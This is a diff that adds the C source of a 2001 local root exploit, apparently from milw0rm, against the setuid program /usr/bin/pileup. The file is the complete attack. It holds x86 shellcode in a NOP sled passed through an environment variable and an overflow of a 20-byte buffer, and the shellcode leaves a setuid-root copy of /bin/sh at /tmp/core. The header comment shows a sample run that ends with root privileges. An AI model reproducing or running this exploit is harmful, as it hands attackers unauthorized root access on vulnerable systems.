@@ -1,0 +1,132 @@
+/* pileup-xpl.c - local root exploit
+ *
+ * by core
+ *
+ * Friday the 13th, July 2001
+ *
+ * based almost entirely on code by Cody Tubbs (loophole of hhp)
+ *
+ * $ ./pileup-xpl
+ * pileup-xpl by core 2001 - beep beep root!
+ * usage: ./pileup-xpl [offset] [align(0..3)]
+ * Ret-addr: 0xbfffe09c, offset: 0, align: 0.
+ * How many voices (1 to 9)
+ * Starting speed (wpm)
+ * (C)ompetion mode or (P)ractice mode
+ * Enter '0' to abort the session! GL..
+ *
+ * TX              RX         TX           RX
+ * --              --         --           --
+ *
+ * Accuracy: 0/6. Max speed: 13
+ * Score: 0
+ * Score: core wins!
+ * core-2.03# id
+ * uid=1000(core) gid=1000(core) euid=0(root) groups=1000(core)
+ * core-2.03# exit
+ * $
+ *
+ * greetz b10z, hhp, loophole
+ *
+ */
+#include <stdio.h> 
+#include <stdlib.h>
+#include <unistd.h>
+
+#define SH_IS_BASH 1 /* if /bin/sh -> /bin/bash */
+
+#define PATH   "/usr/bin/pileup"  // Change to direct path if needed. 
+#define OFFSET 0                  // Worked for me. 
+#define ALIGN  0                  // Don't change. 
+#define NOP    0x90               // x86 No OPeration. 
+#define DBUF   20                 // 16+4(ebp)+4(eip)=24. 
+#define DAT    "calls.dat"        // Required for exploitation. 
+ 
+static char shellcode[]=
+"\x31\xc0" /* set[gu]id(0);/bin/cp /bin/sh /tmp/core;chmod 4555 /tmp/core */
+"\x31\xdb\xb0\x17\xcd\x80\x66\x31\xc0\x66\x31\xdb\xb0\x2e\xcd\x80"
+"\xeb\x5e\x5f\x31\xc0\x88\x47\x07\x88\x47\x0f\x88\x47\x19\x89\x7f"
+"\x1a\x8d\x77\x08\x89\x77\x1e\x31\xf6\x8d\x77\x10\x89\x77\x22\x89"
+"\x47\x26\x89\xfb\x8d\x4f\x1a\x8d\x57\x26\x31\xc0\xb0\x02\xcd\x80"
+"\x31\xf6\x39\xc6\x75\x06\xb0\x0b\xcd\x80\xeb\x1d\x31\xd2\x31\xc0"
+"\x31\xdb\x4b\x8d\x4f\x26\xb0\x07\xcd\x80\x31\xc0\x8d\x5f\x10\x31"
+"\xc9\x66\xb9\x6d\x09\xb0\x0f\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80"
+"\xe8\x9d\xff\xff\xff/bin/cp8/bin/sh8/tmp/core";
+
+long get_sp(void) {
+   __asm__("movl %esp,%eax");
+} 
+ 
+void usage(char *name){ 
+   fprintf(stderr, "pileup-xpl by core 2001 - beep beep root!\n");
+   fprintf(stderr, "usage: %s [offset] [align(0..3)]\n", name);
+}
+ 
+int main(int argc, char **argv){ 
+   char eipeip[DBUF], buffer[7192]; 
+   char go[DBUF + 22]; 
+   FILE *calls; 
+   int i, offset, align; 
+   long address;
+
+   usage(argv[0]);
+
+   /* Remove the config and write OWNED! */
+   unlink(DAT);
+   calls = fopen(DAT, "w");
+   fprintf(calls, "OWNED\n");
+   fclose(calls);
+
+   /* Do command line */
+   if (argc > 1) {
+      offset = atoi(argv[1]);
+   }
+   else {
+      offset = OFFSET;
+   } 
+
+   if (argc > 2) { 
+      align = atoi(argv[2]);
+   } 
+   else { 
+      align = ALIGN;
+   } 
+
+   address = get_sp() - offset;
+ 
+   if (align > 0) {
+      for(i=0; i < align; i++) {
+	 eipeip[i] = 0x69;
+      }
+   }
+ 
+   for (i=align; i < DBUF; i+=4) {
+      *(long *)&eipeip[i] = address;
+   } 
+   for (i=0; i < (7192 - strlen(shellcode) - strlen(eipeip)); i++) {
+      buffer[i] = NOP;
+   }
+
+   /* setup the environment */
+   memcpy(buffer + i, shellcode, strlen(shellcode)); 
+   memcpy(buffer, "UPEX=", 5);
+   putenv(buffer);
+   
+   fprintf(stderr, "Ret-addr: %#x, offset: %d, align: %d.\n", address, \
+	   offset, align); 
+
+   sprintf(go, "(printf '1\n0\nC\n%s\n0\n')|%s", eipeip, PATH); //netcat style.
+   system(go);
+
+   fprintf(stderr, "Score: core wins!\n");
+   
+#ifdef SH_IS_BASH   
+   system("/tmp/core -p");
+#else
+   system("/tmp/core");
+#endif
+
+   return 0;
+} 
+
+// milw0rm.com [2001-07-13]
